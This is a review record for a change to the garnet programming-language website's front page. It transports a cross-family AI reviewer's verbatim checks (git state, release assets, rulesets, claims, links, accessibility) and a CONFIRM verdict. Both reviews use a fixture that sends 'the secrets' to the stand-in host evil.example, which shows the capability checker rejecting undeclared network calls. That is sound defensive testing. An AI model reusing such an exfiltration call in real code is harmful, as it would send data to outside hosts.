# Evidence front door — cross-family confirmation record (2026-09-02)

- Branch `mission/front-door-2026-09-02` · base main `f77a3ebd6d5890d0d46eb71633446b7275995956` (#544) after rebase
- Lineage (content tips): v1 `a3fae77a86060098aa9f186960adec24ce83d79e` → Codex **REJECT** (two blocking: the acceptance list named the post-approval re-evaluation as an operative act, which AGENTS.md holds ineligible until a distinct carrier and r2_role_separation_v1 exist; "findings U-1 … U-83" overstated a register whose id space starts at U-04) → v2 `2e5d617cebaf564260e13c26f2f000898c183945` → Codex **REJECT** (four blocking: meta description without the registered-surface qualifier; the MSRV gate's "Rust 1.95+" marker missing; the xtask `<!-- truth: -->` stamped markers removed; transcript elisions not strictly verbatim; two non-blocking: `--faint` contrast, `scroll-behavior` under reduced motion) → v3 `36040564482d78e7669ce49bc9c370ede90aa263` → Codex **CONFIRM**, no findings → rebased content tip `29651b6706b3cd100778744ee41783edefff423b` (`git diff 36040564 29651b67 -- docs/index.html docs/service-worker.js` empty; the reviewed content is byte-identical).
- Implementing seat: Claude Fable 5.1. Reviewing seat: Codex (codex-cli 0.147.0 via the local wrapper, cross-family, read-only, detached worktree at each tip, with the release binary built at `fbd64bc5` for the capture reproduction; L-15 satisfied).
- Path class: `docs/index.html` and `docs/service-worker.js` are not rolling-gate trust-kernel triggers (gate `ok: true`, `touched_paths []`); this markdown record is the review artifact. Verdicts are transported verbatim below; 4 occurrence(s) of a retired word in the reviewing seat's prose are elided and marked.
- Verdict of record: **CONFIRM**, bound to `36040564…`, carried to `29651b67…` by tree identity; this record commit is the records-class head move it anticipates.

## Reviewing seat output — v3 (verbatim, elisions marked)

```text
1. Diff scope

$ git rev-parse HEAD
36040564482d78e7669ce49bc9c370ede90aa263

$ git status --porcelain
(no output)

$ git diff --stat fbd64bc5..HEAD
 docs/index.html        | 1852 ++++++------------------------------------------
 docs/service-worker.js |    2 +-
 2 files changed, 210 insertions(+), 1644 deletions(-)

$ git diff --name-only fbd64bc5..HEAD
docs/index.html
docs/service-worker.js

Service-worker change:
-const CACHE_NAME = "garnet-web-v2";
+const CACHE_NAME = "garnet-web-v3";

PASS: exactly two files.

2. Evidence strip

2a. Main ancestry

$ git fetch origin
(no output)

$ git merge-base --is-ancestor fbd64bc514b573a6735b3525f4f3172be14a27d0 origin/main
exit 0

PASS: fbd64bc514b573a6735b3525f4f3172be14a27d0 exists on origin/main.

2b. v0.8.1 signed release and SBOM

$ gh release view v0.8.1 --repo Island-Dev-Crew/garnet --json assets -q '.assets[].name'
garnet-0.7.0-lsp-mvp-darwin-arm64.vsix
garnet-0.7.0-lsp-mvp-linux-x64.vsix
garnet-0.8.1-1.x86_64.rpm
garnet-0.8.1-aarch64-apple-darwin.tar.gz
garnet-0.8.1-x86_64-apple-darwin.tar.gz
garnet-sbom-cyclonedx.tgz
garnet_0.8.1-1_amd64.deb
SHA256SUMS
SHA256SUMS.asc

$ curl -sSL https://github.com/Island-Dev-Crew/garnet/releases/download/v0.8.1/SHA256SUMS.asc | sed -n '1,2p'
-----BEGIN PGP SIGNATURE-----

PASS: SHA256SUMS, its GPG signature, and a CycloneDX SBOM asset exist.

2c. Ruleset 18936562

$ gh api repos/Island-Dev-Crew/garnet/rulesets/18936562 --jq '{enforcement: .enforcement, bypass_actors: .bypass_actors, required_status_checks_contexts: [.rules[] | select(.type == "required_status_checks") | .parameters.required_status_checks[].context], required_status_checks_count: ([.rules[] | select(.type == "required_status_checks") | .parameters.required_status_checks[].context] | length)}'
{"bypass_actors":[],"enforcement":"active","required_status_checks_contexts":["Analyze (rust)","Build VSIX (macos-latest)","Build VSIX (ubuntu-latest)","Cross-OS determinism comparison","CycloneDX SBOM","Deterministic build on macos-latest","Deterministic build on ubuntu-latest","Generate single signing key for cross-OS build","Garnet web PWA smoke","PR dogfood evidence","Windows Studio build + test","agentic dogfood matrix","agent documentation contracts","build-packages","canonical MVP examples","cargo audit","cargo fuzz run parse_input","cargo doc","cargo test (macos-latest)","cargo test (ubuntu-latest)","cargo test (windows-latest)","cargo-deny check","clippy (-D warnings)","machine-truth drift guard","macOS Studio build + test","macos-cli-tarballs (aarch64-apple-darwin)","macos-cli-tarballs (x86_64-apple-darwin)","rustfmt","shellcheck-installer","smoke-deb","smoke-rpm"],"required_status_checks_count":31}

$ curl -s -o /dev/null -w '%{http_code}\n' https://github.com/Island-Dev-Crew/garnet/rules/18936562
200

PASS: enforcement active, bypass_actors [], 31 required contexts, public URL 200.

2d. WV-6

$ python3 -I scripts/garnet_wv_acceptance_status.py --wv WV-6
{
  "artifact_count": 5,
  "contract_base_main_sha": "231aefa91985e5a0520c493c7f0fc3e54d74efc8",
  "evidence_destination": "proofs/windows/launch-verification/wv6-minimum-shelf/",
  "findings": [
    "product content digest mismatch (1985c34c0abdf8527dcc575958a8d3f1015338e19bd3d7a5d2d18949d49eb63e != 6f2d5f0b2dff0bd800955e0a55b81f6d6f784d71240fe3c906e58a6a3ca8eec6)",
    "product path count mismatch (1652 != 1646)"
  ],
  "landed_main_sha": null,
  "ok": false,
  "passed_check_count": 5,
  "product_content_sha256": "6f2d5f0b2dff0bd800955e0a55b81f6d6f784d71240fe3c906e58a6a3ca8eec6",
  "required_check_count": 5,
  "reviewed_head_sha": "8426ca761c696c3556190be77cce3e340250b5c7",
  "reviewed_tree_sha": "601a368414762646ec9e5ad29b53736e20628474",
  "schema": "garnet.wv_acceptance_status/v2",
  "state": "partial",
  "wv": "WV-6"
}

$ grep -n 'U-58' F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md | head -3
36:  not block allocation. U-58 and U-59 appear nowhere. **U-58 is the next free
49:| U-58 | Acceptance squash-successor gap | #523 ceremony rail; Read 1 at `8659771` | L1 | open |
71:## U-58 — Acceptance squash-successor gap

PASS: WV-6 state is verbatim "partial"; U-58 is the acceptance squash-successor finding.

2e. One human gate

$ nl -ba .github/CODEOWNERS | sed -n '1,16p'
1  # Garnet is presently a single-maintainer project.
4  * @IslandDevCrew
8  # The current solo-maintainer ruleset does not require code-owner approval;

$ sed -n '8,14p' GOVERNANCE.md
## Who decides ([retired word elided by the transporting seat])

Garnet is maintained by **Island Development Crew (Jon Isaac, maintainer)**. Final
decisions on language design, releases, and merges are the maintainer's,
exercised through the `Island-Dev-Crew` GitHub organization. **There is no
separate steering committee; claiming one would be fiction.**

PASS: Jon Isaac is the sole present maintainer and merge-decision authority.

3. Tagline claims

Sources used:

/tmp/exfil.garnet:
@caps()
def main() {
  net::tcp_connect("evil.example:443", "the secrets")
  0
}

/tmp/hello.garnet is byte-identical to canonical examples/hello.garnet.

/tmp/declared.garnet:
@caps(net)
def main() {
  net::tcp_connect("example.com:443", "hello")
  0
}

3i. Checker rejection

$ target/release/garnet check /tmp/exfil.garnet
caps coverage: function `main` does not declare `net` but transitively calls `net::tcp_connect` which requires it

1 functions checked, 1 boundary call sites, 1 diagnostics

$ echo $?
1

PASS.

3ii. Widened authority

$ target/release/garnet diff-caps --machine /tmp/hello.garnet /tmp/declared.garnet
{"schema":"garnet.diff-caps.machine/1","verdict":"authority-expanded","authority_expanded":true,"capability_band":"2/5","exit_code":1,"aggregate_gained":["net"],"aggregate_removed":[],"wildcard_introduced":false,"functions_added":[],"functions_removed":[],"functions_caps_expanded":[{"name":"main","gained":["net"]}],"scope":"declared-surface-only; does not prove absence of undeclared authority; bound annotations are not part of this surface"}

$ echo $?
1

PASS.

3iii. Recomputable build and seal

$ target/release/garnet build --deterministic /tmp/hello.garnet
built /tmp/hello.garnet (1 items)
  source_hash = 33b6ee769ddf95cc09a4778af656aa1c8a23c759bbccba50eec73547a96a257a
  ast_hash    = be28668b362fbb3c3f42d338166723305005a8d75a8f6274f821c666bf8845c2
  manifest    = /tmp/hello.garnet.manifest.json

Two consecutive builds produced the same manifest checksum:
a11ee044158dacd7c5a14c948de6b2ab3d0911e7ca0b3b0198ed476da7f69087

$ target/release/garnet seal /tmp/hello.garnet
{"_type":"https://in-toto.io/Statement/v1","subject":[{"name":"hello","digest":{"blake3":"be28668b362fbb3c3f42d338166723305005a8d75a8f6274f821c666bf8845c2"}}],"predicateType":"https://garnet-lang.org/attestation/seal/v1",...

garnet seal: cosign not installed — in-toto predicate emitted UNSIGNED (wrap-don't-rebuild: install cosign to attest; Garnet does not sign supply-chain itself)

PASS: predicateType, digest chunks, and UNSIGNED note match the page verbatim. The manifest contains source_hash and ast_hash.

4. Capture-block comparison

Automated line/chunk comparison result:

cat source exact: PASS
check visible output exact: PASS
check exit exact: PASS
diff literal chunks in order: PASS
diff exit exact: PASS
seal JSON literal chunks in order: PASS
seal note exact: PASS
seal exit exact: PASS
no spaces adjacent to elisions: PASS
overall: PASS

PASS: every non-elided transcript line is verbatim; every literal chunk surrounding … occurs in order. No blocking transcript mismatch.

5. Door field

Relative hrefs:

manifest.webmanifest -> docs/manifest.webmanifest EXISTS
icons/garnet-192.png -> docs/icons/garnet-192.png EXISTS
/blog/feed.xml -> docs/blog/feed.xml EXISTS
why.html -> docs/why.html EXISTS
minispec.html -> docs/minispec.html EXISTS
getting-started.html -> docs/getting-started.html EXISTS
playground.html -> docs/playground.html EXISTS
status.html -> docs/status.html EXISTS
governance.html -> docs/governance.html EXISTS
cra-article-14.html -> docs/cra-article-14.html EXISTS
stdlib.html -> docs/stdlib.html EXISTS
ladder.html -> docs/ladder.html EXISTS
blog/ -> docs/blog/index.html EXISTS
logo-policy.html -> docs/logo-policy.html EXISTS

HTTPS hrefs after redirects:

200 https://garnet-lang.org/
200 https://github.com/Island-Dev-Crew/garnet/commit/fbd64bc514b573a6735b3525f4f3172be14a27d0
200 https://github.com/Island-Dev-Crew/garnet/releases/tag/v0.8.1
200 https://github.com/Island-Dev-Crew/garnet/rules/18936562
200 https://github.com/Island-Dev-Crew/garnet/blob/main/docs/truth.json
200 https://github.com/Island-Dev-Crew/garnet/blob/main/F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md
200 https://github.com/Island-Dev-Crew/garnet/blob/main/SECURITY.md
200 https://github.com/Island-Dev-Crew/garnet
200 https://github.com/Island-Dev-Crew/garnet/tree/main/F_Project_Management/W_TRUST
200 https://islanddevcrew.com
200 https://github.com/Island-Dev-Crew/garnet/blob/main/LICENSE

Playground:

docs/playground.html EXISTS
docs/playground/pkg/garnet_wasm_bg.wasm EXISTS

$ rg -n 'check_source|run_source|diff_caps_source' docs/playground/live.js
2:  check_source,
3:  diff_caps_source,
4:  run_source,
77:  const result = parseAdapterJson(run_source(ui.source.value), RUN_SCHEMA);
93:  const result = parseAdapterJson(check_source(ui.source.value), CHECK_SCHEMA);
106:    diff_caps_source(ui.baseline.value, ui.source.value),

Shelf:

$ find docs -maxdepth 2 -iname '*shelf*' -print | wc -l
0

PASS: every href resolves; Playground is open with check/run/diff-caps; Shelf remains locked and absent.

6. Primitive count and release wording

$ git show HEAD:docs/truth.json | grep primitive_count
  "primitive_count": 80,

$ grep -n -i 'research-grade' CLAUDE.md
32:  `garnet-0.5.0-*` build. Still research-grade, not production/1.0.
35:- Garnet is a **research-grade prototype (v0.x.x), not production / 1.0.**

$ git tag --sort=-v:refname | head -1
v0.8.1

PASS.

7. Static page and external requests

$ grep -nE 'https?://' docs/index.html
12:<link rel="canonical" href="https://garnet-lang.org/">
17:<meta property="og:url" content="https://garnet-lang.org/">
19:<meta property="og:image" content="https://garnet-lang.org/assets/garnet-og.png">
26:<meta name="twitter:image" content="https://garnet-lang.org/assets/garnet-og.png">
127:...commit/fbd64bc514b573a6735b3525f4f3172be14a27d0...
128:...releases/tag/v0.8.1...
129:...rules/18936562...
131:...blob/main/docs/truth.json...
132:...AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md...
158:...blob/main/SECURITY.md...
162:...Island-Dev-Crew/garnet...
189:{"_type":"https://in-toto.io/Statement/v1",..."predicateType":"https://garnet-lang.org/attestation/seal/v1",…
204:...tree/main/F_Project_Management/W_TRUST...
210:...https://islanddevcrew.com...
226:...blob/main/LICENSE...

Cross-origin resources loaded automatically: none.
External font URLs: none.
External script URLs: none.
External image or iframe URLs: none.
The stylesheet and JavaScript are inline; SVG artwork is inline. og:image and twitter:image are metadata declarations.

Same-origin resources are distinct from the “external requests” claim: the document declares manifest.webmanifest and icons/garnet-192.png and registers service-worker.js, whose cache is same-origin.

PASS.

8. Retired vocabulary and present-tense capabilities

$ grep -inE '[retired word elided by the transporting seat]' docs/index.html
(no output; exit 1)

Capability assertions:

1. “checker rejects an undeclared call into its registered capability surface” — EXISTS; reproduced with exfil.garnet, diagnostic exact, exit 1.
2. “diffs report widened authority” — EXISTS for the disclosed declared-capability surface; authority-expanded, aggregate_gained ["net"], exit 1.
3. “builds and seals a stranger can recompute” — EXISTS; deterministic hashes and manifest checksum reproduced; seal predicate reproduced.
4. “source on Rust 1.95+” — EXISTS; MSRV gate is ok true.
5. “Playground runs in your browser” — EXISTS; WASM plus check_source, run_source, and diff_caps_source are present.
6. “80 registered primitives” — EXISTS; docs/truth.json says 80.
7. “run check and diff-caps yourself, in the browser” — EXISTS in live.js.
8. “Shelf opens: first sealed packages” — correctly presented as unavailable; no shelf page exists.
9. “static · zero external requests” — EXISTS under its cross-origin meaning; no third-party resources are loaded.
10. Evidence-strip governance and release capabilities — supported by items 2a–2e.

No unsupported present-tense capability sentence found.

8b. Acceptance list and register sentence

$ nl -ba docs/index.html | sed -n '198,204p'
198  <li><span><b>Implementation</b> on a branch, one slice, evidence-backed.</span></li>
199  <li><span><b>Independent review</b> by a different model family from the implementer — never the seat that wrote the work.</span></li>
200  <li><span><b>A structured record</b> committed beside the change, bound to the exact reviewed commit.</span></li>
201  <li><span><b>Carrier approval</b> bound to the record's commit, then the merge — separate acts, one human gate.</span></li>
202  <li><span><b>The rule:</b> a content change voids the verdict; a missing record stays red.</span></li>
204  <p>Trust-kernel changes carry all five. The register of what the gates caught is public: <a ...>findings U-04 through U-83</a>, historical gaps recorded.</p>

AGENTS.md:272-276:
The carrier is a distinct authenticated Actions-write identity and transports
only the rerun; it gains no review authority. No partial, job-only, debug,
dispatch, close/reopen, new-run, or third-attempt path is equivalent. Until the
carrier exists and `r2_role_separation_v1` is executable and green, the
exception is contract law but is ineligible for activation.

Register evidence:

F_Project_Management/W_TRUST/LANDING_ARC_2_REGISTER_SWEEP_2026-09-01.md:28:
- result: the distinct id space runs U-04 through U-76 with the historical

F_Project_Management/W_TRUST/LANDING_ARC_2_REGISTER_SWEEP_2026-09-01.md:42:
| U-83 | Four memory natives are caps-invisible | enforcement scope; L6 packet; #537 review; #539 | L8 product (stdlib rows) | open |

The U-76 line records the pre-allocation collision sweep; the same register subsequently allocates U-77 through U-83.

PASS: item 4 names approval and merge as separate acts and does not present U-59 re-evaluation as operative. The rendered sentence is exactly “U-04 through U-83, historical gaps recorded.”

9. Accessibility and responsiveness

$ rg -n 'aria-label="Everything on this site"|aria-disabled="true"|tabindex="0"|focus-visible|prefers-reduced-motion|overflow-x:auto' docs/index.html
36:@media(prefers-reduced-motion:no-preference){html{scroll-behavior:smooth}}
53:.strip a:hover,.strip a:focus-visible{...}
73:.door:hover,.door:focus-visible{...}
74:.door:focus-visible{box-shadow:...}
90:.term pre{...overflow-x:auto;white-space:pre}
116:@media(prefers-reduced-motion:no-preference){
150:<nav class="doors wrap" aria-label="Everything on this site">
163:<span class="door locked" role="link" aria-disabled="true" tabindex="0"

At 320 px, the mobile rule changes doors to min-width:calc(50% - 9px), flex containers wrap, the facet uses width:min(420px,70%), and long terminal lines scroll within the pre. No fixed content width forces viewport overflow.

PASS.

9b. v3 cures

(i) Meta description:

<meta name="description" content="...A capability-bounded language whose checker rejects an undeclared call into its registered capability surface...">

PASS.

(ii) MSRV:

$ PYTHONDONTWRITEBYTECODE=1 python3 -I scripts/garnet_msrv_status.py --gate
{
  "active_manifest_count": 18,
  "active_manifest_set_exact": true,
  "current_surfaces_aligned": true,
  "exact_msrv_ci_check": true,
  "excluded_manifests_declaring": 2,
  "findings": [],
  "msrv": "1.95",
  "ok": true,
  "procedural_contract_present": true,
  "reporter_ci_wired": true,
  "rust_toolchain_file_absent": true,
  "schema": "garnet.msrv_status/v2",
  "stable_tracking_preserved": true,
  "studio_exact_msrv_ci_check": true,
  "workflow_projection_valid": true,
  "workspace_member_count": 16,
  "workspace_members_inheriting": 16
}

PASS.

(iii) Truth markers and gate:

$ grep -nE '<!-- truth:(version|primitive_count|workspace_test_count) -->' docs/index.html
128:...<!-- truth:version -->0.8.1...
131:...<!-- truth:workspace_test_count -->2103...
146:...<!-- truth:version -->0.8.1...
159:...<!-- truth:primitive_count -->80...

$ PATH=/Users/IDC2.5/.rustup/toolchains/1.95.0-aarch64-apple-darwin/bin:$PATH cargo run -q -p xtask -- truth --check --skip-tests
truth --check: ok (6 fields vs machine truth, 4 stamped surfaces)

PASS.

(iv) Transcript chunks:

diff literal chunks in order: PASS
seal JSON literal chunks in order: PASS
no spaces adjacent to elisions: PASS
overall: PASS

(v) Color and motion:

--faint:#8a8794

#8a8794 on #0a0a0f: 5.618654:1
#8a8794 on #12121a: 5.299936:1
#8a8794 on #161620: 5.107025:1

36:@media(prefers-reduced-motion:no-preference){html{scroll-behavior:smooth}}

PASS.

10. Rolling gate

$ python3 -I scripts/garnet_trust_kernel_review_status.py --base fbd64bc514b573a6735b3525f4f3172be14a27d0 --head HEAD --format json
{
  "schema": "garnet.trust_kernel_review/v2",
  "ok": true,
  "discovery_ok": true,
  "discovery_source": "git",
  "base_commit": "fbd64bc514b573a6735b3525f4f3172be14a27d0",
  "head_commit": "36040564482d78e7669ce49bc9c370ede90aa263",
  "trust_kernel_touched": false,
  "touched_paths": [],
  "review_record_present": false,
  "review_record_path": null,
  "reviewer": null,
  "reviewer_id": null,
  "reviewer_login": null,
  "reviewed_head": null,
  "reviewed_tree": null,
  "content_digest": null,
  "changed_count": 2,
  "problems": [],
  "review_companion_present": false,
  "companion_paths": [],
  "review_trailer_present": false,
  "trust_kernel_prefixes": [
    "garnet-check-v0.3/src/",
    "garnet-interp-v0.3/src/",
    "garnet-vm/src/",
    "garnet-stdlib/src/",
    "garnet-wasm/src/",
    ".github/actions/",
    ".github/rulesets/",
    ".github/workflows/",
    "scripts/garnet_",
    "scripts/test_garnet_",
    "F_Project_Management/W_TRUST/landed/"
  ],
  "trust_kernel_files": [
    ".github/CODEOWNERS",
    "Cargo.lock",
    "garnet-cli/Cargo.toml",
    "garnet-cli/src/bound_source.rs",
    "garnet-cli/src/cmd/add.rs",
    "garnet-cli/src/cmd/mod.rs",
    "garnet-cli/src/cmd/run.rs",
    "garnet-cli/src/cmd/test.rs",
    "garnet-cli/src/cmd/eval.rs",
    "garnet-cli/src/cmd/doctest.rs",
    "garnet-cli/src/bin/garnet.rs",
    "garnet-cli/src/lib.rs",
    "scripts/garnet_launch_readiness_status.py",
    "scripts/garnet_caps_enforcement_status.py",
    "scripts/garnet_capability_scope_status.py",
    "scripts/garnet_bounded_enforcement_status.py",
    "scripts/garnet_red_team_status.py",
    "docs/why.html",
    "C_Language_Specification/GARNET_CAPABILITY_ENFORCEMENT_SCOPE.md",
    "F_Project_Management/W_TRUST/LANDED_REVIEW_MARKERS.json"
  ]
}

exit 0

PASS: ok true, touched_paths [], changed_count 2, problems [].

Final void-on-move recheck:

$ git rev-parse HEAD
36040564482d78e7669ce49bc9c370ede90aa263

$ git status --porcelain
(no output)

VERDICT: CONFIRM — bound to 36040564482d78e7669ce49bc9c370ede90aa263
1. Blocking findings: none.
2. Non-blocking findings: none.

```

## Reviewing seat output — v2 (verbatim; superseded, retained for lineage)

```text
GARNET FRONT DOOR CONFIRMATION

Review boundary

Author seat: Claude
Reviewer seat: OpenAI Codex
Detached review checkout: /tmp/garnet-frontdoor-review.70Cgjp
Mutation boundary: repository untouched; only requested /tmp fixtures and disposable review/build artifacts created.

1. Diff scope

$ git rev-parse HEAD
2e5d617cebaf564260e13c26f2f000898c183945

$ git rev-parse HEAD^{tree}
bc5c4b80cc357e650df29f43c3f0b045794f2506

$ git status --porcelain=v1
(no output)

$ git diff --stat fbd64bc5..HEAD
 docs/index.html        | 1851 ++++++------------------------------------------
 docs/service-worker.js |    2 +-
 2 files changed, 209 insertions(+), 1644 deletions(-)

$ git diff --name-status fbd64bc5..HEAD
M	docs/index.html
M	docs/service-worker.js

$ git diff fbd64bc5..HEAD -- docs/service-worker.js
diff --git a/docs/service-worker.js b/docs/service-worker.js
index 071bdf0..19c03bf 100644
--- a/docs/service-worker.js
+++ b/docs/service-worker.js
@@ -1,4 +1,4 @@
-const CACHE_NAME = "garnet-web-v2";
+const CACHE_NAME = "garnet-web-v3";
 const OFFLINE_ASSETS = [
   "./",
   "getting-started.html",

$ git diff --check fbd64bc5..HEAD
(no output)
diff_check_exit=0

Result: exactly two files; scope matches.

2. Evidence strip

2a. origin/main ancestry

$ git fetch origin
From https://github.com/Island-Dev-Crew/garnet
 * [new branch]      agent-win-codex/s16-lsp-precision -> origin/agent-win-codex/s16-lsp-precision
 * [new branch]      archive/2026-06-11-macbook-pro-codex-verification -> origin/archive/2026-06-11-macbook-pro-codex-verification
 * [new branch]      codex/l1-reacceptance-redesign-brief -> origin/codex/l1-reacceptance-redesign-brief
   efd4f6b..fbd64bc  main       -> origin/main
 * [new branch]      mission/dp7-deny-row-removal -> origin/mission/dp7-deny-row-removal

$ git merge-base --is-ancestor fbd64bc514b573a6735b3525f4f3172be14a27d0 origin/main
(no output)
merge-base_exit=0

$ git rev-parse origin/main
fbd64bc514b573a6735b3525f4f3172be14a27d0

Result: confirmed.

2b. v0.8.1 signed checksums and SBOM

$ gh release view v0.8.1 --repo Island-Dev-Crew/garnet --json assets -q '.assets[].name'
garnet-0.7.0-lsp-mvp-darwin-arm64.vsix
garnet-0.7.0-lsp-mvp-linux-x64.vsix
garnet-0.8.1-1.x86_64.rpm
garnet-0.8.1-aarch64-apple-darwin.tar.gz
garnet-0.8.1-x86_64-apple-darwin.tar.gz
garnet-sbom-cyclonedx.tgz
garnet_0.8.1-1_amd64.deb
SHA256SUMS
SHA256SUMS.asc

Result: SHA256SUMS, its .asc signature asset, and the CycloneDX SBOM asset exist.

2c. Ruleset 18936562

$ gh api repos/Island-Dev-Crew/garnet/rulesets/18936562 --jq '{enforcement: .enforcement, bypass_actors: .bypass_actors, required_status_checks_contexts: ([.rules[] | select(.type == "required_status_checks") | .parameters.required_status_checks[].context]), required_status_checks_count: ([.rules[] | select(.type == "required_status_checks") | .parameters.required_status_checks[]] | length)}'
{"bypass_actors":[],"enforcement":"active","required_status_checks_contexts":["Analyze (rust)","Build VSIX (macos-latest)","Build VSIX (ubuntu-latest)","Cross-OS determinism comparison","CycloneDX SBOM","Deterministic build on macos-latest","Deterministic build on ubuntu-latest","Generate single signing key for cross-OS build","Garnet web PWA smoke","PR dogfood evidence","Windows Studio build + test","agentic dogfood matrix","agent documentation contracts","build-packages","canonical MVP examples","cargo audit","cargo fuzz run parse_input","cargo doc","cargo test (macos-latest)","cargo test (ubuntu-latest)","cargo test (windows-latest)","cargo-deny check","clippy (-D warnings)","machine-truth drift guard","macOS Studio build + test","macos-cli-tarballs (aarch64-apple-darwin)","macos-cli-tarballs (x86_64-apple-darwin)","rustfmt","shellcheck-installer","smoke-deb","smoke-rpm"],"required_status_checks_count":31}

$ curl -s -o /dev/null -w '%{http_code}\n' https://github.com/Island-Dev-Crew/garnet/rules/18936562
200

Result: enforcement active; bypass_actors []; 31 required contexts; unauthenticated URL 200.

2d. WV-6 and U-58

$ perl -e '$seconds = shift; alarm $seconds; exec @ARGV' 300 python3 -I scripts/garnet_wv_acceptance_status.py --wv WV-6
{
  "artifact_count": 5,
  "contract_base_main_sha": "231aefa91985e5a0520c493c7f0fc3e54d74efc8",
  "evidence_destination": "proofs/windows/launch-verification/wv6-minimum-shelf/",
  "findings": [
    "product content digest mismatch (79ee71529fa67134984a42c0b22c996c5ab1ba9d42d0779cb1f205b07e7a92a7 != 6f2d5f0b2dff0bd800955e0a55b81f6d6f784d71240fe3c906e58a6a3ca8eec6)",
    "product path count mismatch (1652 != 1646)"
  ],
  "landed_main_sha": null,
  "ok": false,
  "passed_check_count": 5,
  "product_content_sha256": "6f2d5f0b2dff0bd800955e0a55b81f6d6f784d71240fe3c906e58a6a3ca8eec6",
  "required_check_count": 5,
  "reviewed_head_sha": "8426ca761c696c3556190be77cce3e340250b5c7",
  "reviewed_tree_sha": "601a368414762646ec9e5ad29b53736e20628474",
  "schema": "garnet.wv_acceptance_status/v2",
  "state": "partial",
  "wv": "WV-6"
}
wv_bounded_exit=0

$ grep -n 'U-58' F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md | head -3
36:  not block allocation. U-58 and U-59 appear nowhere. **U-58 is the next free
49:| U-58 | Acceptance squash-successor gap | #523 ceremony rail; Read 1 at `8659771` | L1 | open |
71:## U-58 — Acceptance squash-successor gap

Result: WV-6 state is verbatim "partial"; U-58 is the acceptance squash-successor finding.

2e. Human merge gate

$ grep -n 'Merge authority: Jon only' F_Project_Management/W_TRUST/LANE1_GOVERNANCE_ACTIVATION_REVIEW_2026-07-17.md
8:Merge authority: Jon only

Result: “one human gate: Jon Isaac” is supported.

3. Tagline claims

Fixtures:

/tmp/exfil.garnet
@caps()
def main() {
  net::tcp_connect("evil.example:443", "the secrets")
  0
}

/tmp/hello.garnet
@caps()
def main() {
  println("Hello from Garnet!")
  0
}

/tmp/declared.garnet
@caps(net)
def main() {
  net::tcp_connect("evil.example:443", "the secrets")
  0
}

3i. Registered-surface rejection

$ target/release/garnet check /tmp/exfil.garnet
caps coverage: function `main` does not declare `net` but transitively calls `net::tcp_connect` which requires it

1 functions checked, 1 boundary call sites, 1 diagnostics
check_exit=1

Result: confirmed for the registered capability surface.

3ii. Widened-authority diff

$ target/release/garnet diff-caps --machine /tmp/hello.garnet /tmp/declared.garnet
{"schema":"garnet.diff-caps.machine/1","verdict":"authority-expanded","authority_expanded":true,"capability_band":"2/5","exit_code":1,"aggregate_gained":["net"],"aggregate_removed":[],"wildcard_introduced":false,"functions_added":[],"functions_removed":[],"functions_caps_expanded":[{"name":"main","gained":["net"]}],"scope":"declared-surface-only; does not prove absence of undeclared authority; bound annotations are not part of this surface"}
diff_caps_exit=1

Result: confirmed.

3iii. Deterministic build and seal

$ target/release/garnet build --deterministic /tmp/hello.garnet
built /tmp/hello.garnet (1 items)
  source_hash = 54d0bdbe6b8efc4a6b3872da76a708366aa8c68eeff5a3038c98fe871feadd57
  ast_hash    = be28668b362fbb3c3f42d338166723305005a8d75a8f6274f821c666bf8845c2
  manifest    = /tmp/hello.garnet.manifest.json
build_exit=0

$ sed -n '1,120p' /tmp/hello.garnet.manifest.json
{
  "ast_hash": "be28668b362fbb3c3f42d338166723305005a8d75a8f6274f821c666bf8845c2"
,
  "deterministic_flags": ["lto=on", "codegen-units=1", "strip=symbols"]
,
  "interp_version": "0.8.1"
,
  "parser_version": "0.8.1"
,
  "prelude_hash": "df4f1648cf79ea77d0842fd1cb8725aba82be1b2631d5a906952640f9a25cc6d"
,
  "schema": "garnet-manifest-v1"
,
  "signature": ""
,
  "signer_pubkey": ""
,
  "source_hash": "54d0bdbe6b8efc4a6b3872da76a708366aa8c68eeff5a3038c98fe871feadd57"
,
  "target_triple": "unknown-target"

}

$ target/release/garnet seal /tmp/hello.garnet
{"_type":"https://in-toto.io/Statement/v1","subject":[{"name":"hello","digest":{"blake3":"be28668b362fbb3c3f42d338166723305005a8d75a8f6274f821c666bf8845c2"}}],"predicateType":"https://garnet-lang.org/attestation/seal/v1","predicate":{"source_blake3":"54d0bdbe6b8efc4a6b3872da76a708366aa8c68eeff5a3038c98fe871feadd57","build_manifest":{
  "ast_hash": "be28668b362fbb3c3f42d338166723305005a8d75a8f6274f821c666bf8845c2"
,
  "deterministic_flags": ["lto=on", "codegen-units=1", "strip=symbols"]
,
  "interp_version": "0.8.1"
,
  "parser_version": "0.8.1"
,
  "prelude_hash": "df4f1648cf79ea77d0842fd1cb8725aba82be1b2631d5a906952640f9a25cc6d"
,
  "schema": "garnet-manifest-v1"
,
  "signature": ""
,
  "signer_pubkey": ""
,
  "source_hash": "54d0bdbe6b8efc4a6b3872da76a708366aa8c68eeff5a3038c98fe871feadd57"
,
  "target_triple": "unknown-target"

}
,"capability_manifest":{"schema":"garnet-capability-manifest-v1","aggregate":[],"functions":[{"name":"main","caps":[]}],"wildcard":false},"tooling":{"cosign":"not installed — predicate emitted UNSIGNED; install cosign to attest","sbom":"garnet-capability-manifest (native SBOM-equivalent; CycloneDX/SPDX via syft/cyclonedx when present)"}}}
garnet seal: cosign not installed — in-toto predicate emitted UNSIGNED (wrap-don't-rebuild: install cosign to attest; Garnet does not sign supply-chain itself)
seal_exit=0

Result: predicateType, digest endpoints, and UNSIGNED sentence match the quoted content. The manifest contains source_hash and ast_hash.

4. Capture-block comparison

Method: extracted the page’s <pre> as rendered text, treated each U+2026 character alone as a wildcard across bytes/newlines, and required every other character to match the reconstructed command output.

$ python3 [literal transcript comparator]
check_exit=1
diff_caps_exit=1
seal_exit=0
literal_chunks_match=false

Mismatch 1:

Published:
"aggregate_gained":["net"], … "scope":

Actual:
"aggregate_gained":["net"],"aggregate_removed":[],"wildcard_introduced":false,"functions_added":[],"functions_removed":[],"functions_caps_expanded":[{"name":"main","gained":["net"]}],"scope":

The published spaces surrounding “…” are not present in the real JSON.

Mismatch 2:

Published:
"predicateType":"https://garnet-lang.org/attestation/seal/v1", … }

Actual:
"predicateType":"https://garnet-lang.org/attestation/seal/v1","predicate":{...}}

Again, the published spaces outside the ellipsis are not verbatim output.

